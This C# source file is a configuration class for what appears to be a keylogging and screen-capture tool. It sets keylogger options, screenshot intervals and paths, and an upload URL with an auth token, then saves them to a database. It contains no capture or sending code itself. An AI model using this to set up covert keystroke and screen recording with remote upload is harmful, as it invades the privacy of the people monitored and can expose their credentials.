using Common.ConfigurationManager;
using Common.Helpers;
using Common.Interfaces;
using Common.Models;
using System;
using System.Collections.Generic;
using System.Threading;

namespace Common.ConfigurationManager
{
    public static class ConfigurationApplier
    {
        public static void Apply(Dictionary<string, string> config, ILogger customLogger = null)
        {
            var logger = customLogger ?? new Logger();

            try
            {
                var conf = new ConfigurationManager();

                foreach (var kv in config)
                {
                    switch (kv.Key)
                    {
                        case "KeyLoggerSessionIdle":
                            conf.KLConfig.KeyLoggerSessionIdle = SafeInt(kv.Value);
                            break;
                        case "KeyLoggerEnableRawEvents":
                            conf.KLConfig.KeyLoggerEnableRawEvents = SafeBool(kv.Value);
                            break;
                        case "ScreenshotInterval":
                            conf.ScrConfig.ScreenshotInterval = SafeInt(kv.Value);
                            break;
                        case "JpegQuality":
                            conf.ScrConfig.JpegQuality = SafeInt(kv.Value);
                            break;
                        case "ScreenshotPath":
                            conf.ScrConfig.ScreenshotPath = kv.Value;
                            break;
                        case "OnChangedWindow":
                            conf.ScrConfig.OnChangedWindow = SafeBool(kv.Value);
                            break;
                        case "UploadUrl":
                            conf.UpConfig.UploadUrl = kv.Value;
                            break;
                        case "SenderInterval":
                            conf.UpConfig.SenderInterval = SafeInt(kv.Value);
                            break;
                        case "AuthToken":
                            conf.UpConfig.AuthToken = kv.Value;
                            break;
                        case "DataPath":
                            conf.DataPath = kv.Value;
                            break;
                    }
                }

                ConfigurationManager.CurrentConfig = conf;

                try
                {
                    DBContexts.Insert(conf.KLConfig);
                    logger.LogInformation("KeyLoggerConf inserted successfully.");
                }
                catch (Exception ex)
                {
                    logger.LogError($"Error inserting KeyLoggerConf: {ex.Message}");
                }

                try
                {
                    DBContexts.Insert(conf.ScrConfig);
                    logger.LogInformation("ScreenshotConf inserted successfully.");
                }
                catch (Exception ex)
                {
                    logger.LogError($"Error inserting ScreenshotConf: {ex.Message}");
                }

                try
                {
                    DBContexts.Insert(conf.UpConfig);
                    logger.LogInformation("UploadConf inserted successfully.");
                }
                catch (Exception ex)
                {
                    logger.LogError($"Error inserting UploadConf: {ex.Message}");
                }

                logger.LogInformation("Configuration applied successfully.");
            }
            catch (Exception ex)
            {
                logger.LogError($"Error in ConfigurationApplier.Apply: {ex.Message}");
                throw;
            }
        }

        private static int SafeInt(string v) => int.TryParse(v, out var x) ? x : 0;
        private static bool SafeBool(string v) => bool.TryParse(v, out var x) && x;
    }
}